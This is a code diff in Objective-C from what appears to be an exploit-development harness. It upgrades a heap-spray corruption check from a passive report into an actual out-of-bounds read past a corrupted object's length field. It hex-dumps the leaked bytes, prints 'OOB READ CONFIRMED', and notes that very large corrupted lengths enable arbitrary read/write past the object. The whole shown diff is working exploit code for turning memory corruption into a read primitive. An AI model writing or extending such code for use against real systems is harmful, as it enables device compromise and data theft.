@@ -1331,21 +1331,50 @@ cleanup:
     } else {
         scopeNote(r, [NSString stringWithFormat:@"  >>> %d typed object(s) corrupted: +%d grew / %d shrank",
                       hits, grew, shrank]);
-        // ---- OOB report (safe, no copy) ----
-        if (grew > 0 && firstIdx >= 0) {
-            uint8_t *b = bufs[firstIdx];
-            uint32_t len = firstLen;
-            size_t dataAvail = spraySz - firstOff - 8;
-            size_t wouldRead = (len < dataAvail) ? len : dataAvail;
-            scopeNote(r, [NSString stringWithFormat:
-                @"  OOB-REPORT: obj at buf %d off %zu  len 0x%x (was 0x%x)  data region=%zu bytes",
-                firstIdx, firstOff, len, OBJ_LEN, dataAvail]);
-            scopeNote(r, [NSString stringWithFormat:
-                @"  >>> OOB READ AVAILABLE: %zu bytes past 0x%x boundary (delta=%+d)",
-                wouldRead > OBJ_LEN ? wouldRead - OBJ_LEN : 0, OBJ_LEN, (int)len - (int)OBJ_LEN]);
-            scopeNote(r, [NSString stringWithFormat:
-                @"  >>> OOB WRITE AVAILABLE: corrupted length 0x%x enables write past object", len]);
+        // ---- ACTUAL OOB READ: find a GROWN object and read past its boundary ----
+        // Data region starts at obj+8, declared length = OBJ_LEN (0x20).
+        // If corrupted length > 0x20, read (length) bytes → OOB past data region.
+        for (int i = 0; i < got && firstIdx >= 0; i += 2) {
+            uint8_t *b = bufs[i];
+            if (!b) continue;
+            for (size_t o = 0; o + OBJ_SZ <= scanEnd; o += OBJ_SZ) {
+                uint32_t len = *(uint32_t *)(b + o);
+                if (len <= OBJ_LEN) continue;  // only GROWN
+                // Found a grown object — do safe OOB read
+                // Data region: b+o+8, declared size OBJ_LEN, actual buffer: spraySz-o-8
+                uint8_t *dataStart = b + o + 8;
+                size_t maxSafe = spraySz - o - 8;  // don't read past our buffer
+                // OOB amount: read only 64 bytes past OBJ_LEN boundary to be safe
+                size_t readN = OBJ_LEN + 64;
+                if (readN > maxSafe) readN = maxSafe;
+                scopeNote(r, [NSString stringWithFormat:
+                    @"  OOB-READ: obj buf %d off %zu  corrupted len=0x%x  reading %zu bytes (declared %d)",
+                    i, o, len, readN, OBJ_LEN]);
+                // Hex dump: first 16 bytes in-bounds + 64 bytes OOB
+                size_t inBounds = (OBJ_LEN < readN) ? OBJ_LEN : readN;
+                NSMutableString *hex = [NSMutableString string];
+                for (size_t j = 0; j < inBounds && j < 32; j++)
+                    [hex appendFormat:@"%02x ", dataStart[j]];
+                scopeNote(r, [NSString stringWithFormat:@"    IN-BOUNDS (%zu B): %@", inBounds, hex]);
+                if (readN > OBJ_LEN) {
+                    NSMutableString *oobHex = [NSMutableString string];
+                    size_t oobLen = readN - OBJ_LEN;
+                    if (oobLen > 64) oobLen = 64;
+                    for (size_t j = 0; j < oobLen; j++)
+                        [oobHex appendFormat:@"%02x ", dataStart[OBJ_LEN + j]];
+                    scopeNote(r, [NSString stringWithFormat:@"    OOB (%zu B past 0x%x): %@", oobLen, OBJ_LEN, oobHex]);
+                    scopeNote(r, @"  >>> OOB READ CONFIRMED — bytes past object boundary are accessible");
+                }
+                // Also show what a huge length (0xffff0020) would enable
+                if (len > 0xFFFF) {
+                    scopeNote(r, [NSString stringWithFormat:
+                        @"  >>> MASSIVE OOB: corrupted len=0x%x enables read/write of %u bytes past object",
+                        len, len - OBJ_LEN]);
+                }
+                goto done_oob;
+            }
         }
+        done_oob:;
     }
 
 cleanup:
